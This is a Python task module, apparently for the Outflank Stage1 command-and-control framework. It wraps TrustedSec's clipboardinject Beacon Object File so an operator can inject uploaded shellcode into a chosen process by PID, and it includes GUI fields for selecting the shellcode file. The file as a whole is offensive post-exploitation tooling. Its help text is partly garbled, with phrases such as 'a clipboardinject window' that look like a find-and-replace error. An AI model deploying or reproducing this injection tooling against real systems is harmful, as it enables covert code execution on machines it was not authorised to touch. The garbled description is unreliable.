from typing import Dict, List, Optional, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


class ClipboardInjectBOF(BaseBOFTask):

    def __init__(self):
        super().__init__("clipboardinject")

        self.parser.description = "This command injects shellcode into a process using the clipboardinject technique in combination with loading our own version of the syscall commands from ntdll on disk. This can only target processes with windows that have a clipboardinject window, e.g., explorer.exe, vmtoolsd.exe, or the svchost.exe on Windows 10 responsible for theclipboardinject service."

        self.parser.epilog = "Usage: clipboardinject <PID>"

        self.parser.add_argument(
            "pid",
            help="The PID to inject the shellcode into"
        )

    def _encode_arguments_bof(self, arguments: List[str]) -> List[Tuple[BOFArgumentEncoding, str]]:
        parser_arguments = self.parser.parse_args(arguments)

        shellcode = self.get_file_by_name("shellcode")

        return [
            (BOFArgumentEncoding.INT, parser_arguments.pid),
            (BOFArgumentEncoding.BUFFER, shellcode.content),
        ]

    def validate_files(self, arguments: List[str]):
        shellcode_file = self.get_file_by_name("shellcode")

        if shellcode_file is None:
            raise TaskInvalidArgumentsException("No .bin file uploaded.")

    def get_gui_elements(self) -> Optional[Dict]:
        return {
            "title": "clipboardinject by Trustedsec",
            "desc": "Using clipboardinject BOF by Trustedsec to inject shellcode into a current/remote process.",
            "elements": [
                {
                    "name": "shellcode",
                    "type": "file",
                    "description": "Shellcode",
                    "placeholder": "Select .bin Shellcode",
                },
            ],
        }
